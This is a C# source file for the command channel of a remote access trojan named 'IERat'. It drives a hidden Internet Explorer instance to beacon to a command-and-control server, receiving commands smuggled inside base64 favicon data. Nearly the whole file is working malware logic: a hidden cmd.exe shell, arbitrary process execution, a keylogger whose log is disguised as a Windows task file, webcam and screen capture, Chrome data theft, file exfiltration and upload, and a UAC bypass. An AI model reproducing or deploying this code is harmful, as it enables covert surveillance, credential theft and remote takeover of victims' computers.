﻿using mshtml;
using SHDocVw;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using IERat.lib.Actions;
using System.Reflection;
using System.Collections.Generic;

namespace IERat.lib
{
    class Channel
    {
        public Channel()
        {
            Status = "Connecting";
            Agent = new Agent();
            InternetExplorer = new InternetExplorerClass();
        }
        public string Status { get; set; }
        public bool IEvisible { get; set; }
        public Agent Agent { get; set; }
        InternetExplorer InternetExplorer { get; set; }
        public string CurrentRequest { get; set; }
        public string BaseURL { get; set; }
        public int SleepTime { get; set; }
        void DocumentComplete(object pDisp, ref object URL)
        {
            if (InternetExplorer.LocationURL.Contains(this.BaseURL))
            {
                HTMLDocument DOM = (HTMLDocument)InternetExplorer.Document;
                var Links = DOM.getElementsByTagName("link");
                try
                {
                    foreach (IHTMLElement Link in Links)
                    {
                        if (Link.getAttribute("rel").Contains("icon")) 
                        {
                            string favicon = Link.getAttribute("href"); // command goes here [icon]
                            ParseTask(favicon);
                        }
                    }
                }
                catch
                {
                   Console.WriteLine("Error - favicon not found in DOM"); 
                }
            }
        }
        public void Open()
        {
            InternetExplorer.DocumentComplete += new DWebBrowserEvents2_DocumentCompleteEventHandler(DocumentComplete);
            Thread thread = new Thread(new ThreadStart(Start));
            thread.Start();
            Thread ExecuteAgentTasksThread = new Thread(new ThreadStart(ExecuteAgentTasks));
            ExecuteAgentTasksThread.Start();
        }
        public void Close()
        {
            InternetExplorer.Quit();
            this.Status = "Killed";
        }
        public void Start()
        {
            while (true)
            {           
                try
                {
                    RequestObject requestObject = new RequestObject(Agent.ID);
                    // look for completed tasks and add results to the request
                    while (this.Agent.CompletedAgentTasks.Count != 0)
                    {
                        TaskObject task = this.Agent.CompletedAgentTasks.Dequeue();
                        requestObject.CompletedTasks.Add(task);
                    }

                    string output, EndPoint;

                    if (this.Status == "Connecting") {
                        output = Agent.GenerateBeacon();
                        EndPoint = "auth";
                    }
                    else
                    {
                        output = requestObject.ToJSON();
                        EndPoint = "fetch";
                    }

                    object PostData = ASCIIEncoding.ASCII.GetBytes(output);
                    string URL = BaseURL + "/api/v1/" + EndPoint;
                    InternetExplorer.Navigate(URL, Type.Missing, Type.Missing, ref PostData, "Content-Type: application/json; charset=utf-8");

                    // to bypass ssl certificate validation use:
                    // https://www.fl0re.com/2019/11/06/powershell-internet-explorer-automation-part-2/
                    /*
                     * #Make sure the page is ready.
                        while($objInternetExplorer.ReadyState -ne 4)
                        {
                            Start-Sleep -Milliseconds 100;
                        }

                        $objInternetExplorer.Document.IHTMLDocument3_getElementById("overridelink").Click();
                     */

                }
                catch (Exception ex)
                {
                    this.Status = "Disconnected";
                    Console.WriteLine(ex.GetBaseException().Message);
                }

                Thread.Sleep(this.SleepTime);
            }
        }
        public void ParseTask(string favicon)
        {
            try
            {
                favicon = favicon.Split(new string[] { "data:image/x-icon;base64," }, StringSplitOptions.None)[1];
                string ResponseObjectJSON = Utils.Base64Decode(favicon);
                var js = new JavaScriptSerializer { MaxJsonLength = 2097152 * 3 };
                ResponseObject responseObject = js.Deserialize<ResponseObject>(ResponseObjectJSON);
                if (responseObject.AgentID == this.Agent.ID)
                {
                    if (responseObject.Type == "NewAgent")
                    {
                        if (responseObject.Notes == "Authenticated")
                        {
                            //Debug.WriteLine("Authenticated Successfully");
                            this.Status = "Connected";
                        }
                    }

                    else if ((responseObject.Type == "NewTasks") && (responseObject.Tasks.Count != 0))
                    {
                        var queue = new Queue<TaskObject>(responseObject.Tasks);
                        while (queue.Count > 0)
                            this.Agent.AgentTasks.Enqueue(queue.Dequeue());
                    }
                }
            }
            catch
            {
                Debug.WriteLine("parsing failed");
            }
        }
        public void ExecuteAgentTasks()
        {
            while (true)
            {
                while (this.Agent.AgentTasks.Count != 0)
                {
                    TaskObject NewAgentTask = this.Agent.AgentTasks.Dequeue();
                    string CmdType = NewAgentTask.Type;
                    Task.Run(() =>
                    {
                        if (CmdType == "Authenticated") { this.Status = "Connected"; }
                        else if (CmdType == "Reset") { this.Status = "Connecting"; }
                        else
                        {
                            try
                            {
                                NewAgentTask.Status = "Completed";
                                if ((CmdType == "camsnapshot") || (CmdType == "chrome"))  // add other modules to the if that do not run as threads
                                {
                                    MethodInfo StartMethod = null;
                                    if (this.Agent.LoadedModules.ContainsKey(CmdType))
                                    {
                                        StartMethod = (MethodInfo)this.Agent.LoadedModules[CmdType];
                                    }
                                    else
                                    {
                                        StartMethod = (MethodInfo)Modules.LoadModule(NewAgentTask.args, CmdType);
                                        NewAgentTask.args = "";
                                        this.Agent.LoadedModules.Add(CmdType, StartMethod);
                                    }

                                    if (CmdType == "camsnapshot")
                                    {
                                        byte[] result = (byte[])StartMethod.Invoke(null, null);
                                        NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(result));
                                    }
                                    else
                                    {
                                        NewAgentTask.Result = (string)StartMethod.Invoke(null, null);
                                    }
                                }
                                else if (CmdType == "execute")
                                {
                                    string procPath = NewAgentTask.args;
                                    string procArgs = "";
                                    if (NewAgentTask.args.Contains(" "))
                                    {
                                        procPath = NewAgentTask.args.Split(' ')[0];
                                        procArgs = NewAgentTask.args.Split(' ')[1];
                                    }
                                    Process process = new Process
                                    {
                                        StartInfo = new ProcessStartInfo(procPath)
                                    };
                                    process.StartInfo.Arguments = procArgs;
                                    process.Start();
                                    NewAgentTask.Result = "Process started with PID " + process.Id.ToString();
                                }
                                else if (CmdType == "pwd")
                                {
                                    string pwd = Directory.GetCurrentDirectory();
                                    NewAgentTask.Result = pwd;
                                }
                                else if (CmdType == "klog_start")
                                {
                                    if (this.Agent.LoadedModules.ContainsKey("klog"))
                                    {
                                        Thread klogThread = (Thread)this.Agent.LoadedModules["klog"];
                                        if (klogThread.ToString() == "Running")
                                        {
                                            NewAgentTask.Result = "The Klog is already running";
                                        }
                                        else
                                        {
                                            klogThread.Resume();
                                            NewAgentTask.Result = "Klog Resumed";
                                        }
                                    }
                                    else
                                    {
                                        Thread klogThread = (Thread)Modules.LoadModule(NewAgentTask.args);
                                        this.Agent.LoadedModules.Add("klog", klogThread);
                                        klogThread.Start();
                                        NewAgentTask.Result = "Klog Loaded & Started";
                                    }
                                }
                                else if (CmdType == "klog_stop")
                                {
                                    if (this.Agent.LoadedModules.ContainsKey("klog"))
                                    {
                                        Thread klogThread = (Thread)this.Agent.LoadedModules["klog"];
                                        if (klogThread.IsAlive == true)
                                        {
                                            klogThread.Suspend();
                                            NewAgentTask.Result = "The Klog module was stopped";
                                        }
                                        else
                                        {
                                            NewAgentTask.Result = "The Klog module is not running";
                                        }
                                    }
                                    else
                                    {
                                        NewAgentTask.Result = "The Klog module is not loaded";
                                    }
                                }
                                else if (CmdType == "klog_collect")
                                {
                                    if (this.Agent.LoadedModules.ContainsKey("klog"))
                                    {
                                        if (File.Exists(@"C:\Windows\Tasks\Updater.job"))
                                        {
                                            NewAgentTask.Result = File.ReadAllText(@"C:\Windows\Tasks\Updater.job");
                                        }
                                        else { NewAgentTask.Result = "Results file was not found"; }
                                    }
                                    else
                                    {
                                        NewAgentTask.Result = "The Klog module was not loaded";
                                    }
                                }
                                else if (CmdType == "klog_clear")
                                {
                                    if (File.Exists(@"C:\Windows\Tasks\Updater.job"))
                                    {
                                        File.Delete(@"C:\Windows\Tasks\Updater.job");
                                        NewAgentTask.Result = "Results file was deleted successfully";
                                    }
                                    else { NewAgentTask.Result = "Results file was not found"; }
                                }
                                else if (CmdType == "download")
                                {
                                    var File2Send = NewAgentTask.args;
                                    var FileBytes = File.ReadAllBytes(File2Send);
                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(FileBytes));                                   
                                }
                                else if (CmdType == "upload")
                                {
                                    Upload.Start(ref NewAgentTask);
                                }
                                else if (CmdType == "screenshot")
                                {
                                    NewAgentTask.Result = Screenshot.Collect();
                                }
                                else if (CmdType == "rm")
                                {
                                    NewAgentTask.Result = FileOperations.rm(NewAgentTask.args);
                                }
                                else if (CmdType == "mv")
                                {
                                    NewAgentTask.Result = FileOperations.mv(NewAgentTask.args);
                                }
                                else if (CmdType == "cp")
                                {
                                    NewAgentTask.Result = FileOperations.cp(NewAgentTask.args);
                                }
                                else if (CmdType == "Uac_tm")
                                {
                                    NewAgentTask.Result = Uac_tm.Start().ToString();
                                }
                                else if (CmdType == "ls")
                                {
                                    string[] entries = Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*");
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (string line in entries)
                                    {
                                        try  {  stringBuilder.AppendFormat($"\n{line}\t{new FileInfo(line).Length} Bytes");  }
                                        catch  {  stringBuilder.AppendFormat("\n{0}", line);  }
                                    }
                                    NewAgentTask.Result = stringBuilder.ToString();
                                }
                                else if (CmdType == "cd")
                                {
                                    if (Directory.Exists(NewAgentTask.args))
                                    {
                                        Directory.SetCurrentDirectory(NewAgentTask.args);
                                        string pwd = Directory.GetCurrentDirectory();
                                        NewAgentTask.Result = "Switched directory to " + pwd;
                                    }
                                    else { NewAgentTask.Result = "Error - the directory does not exist"; }
                                }
                                else if (CmdType == "kill")
                                {
                                    this.Close();
                                    Environment.Exit(1);
                                }
                                else if (CmdType == "shell")
                                {
                                    Process cmdProcess = new Process
                                    {
                                        StartInfo = new ProcessStartInfo("cmd.exe")
                                    };
                                    cmdProcess.StartInfo.UseShellExecute = false;
                                    cmdProcess.StartInfo.CreateNoWindow = true;
                                    cmdProcess.StartInfo.RedirectStandardOutput = true;
                                    cmdProcess.StartInfo.Arguments = "/c " + NewAgentTask.args;
                                    cmdProcess.OutputDataReceived += (sender, args) => NewAgentTask.Result += args.Data;
                                    cmdProcess.Start();
                                    cmdProcess.BeginOutputReadLine();
                                }
                                else { NewAgentTask.Result = "Error - unknown command"; }

                            }
                            catch (Exception ex)
                            {
                                NewAgentTask.Status = "Failed";
                                NewAgentTask.Result = ex.GetBaseException().Message;
                            }
                            this.Agent.CompletedAgentTasks.Enqueue(NewAgentTask);
                        }
                    });
                }
            }
        }
    }
}
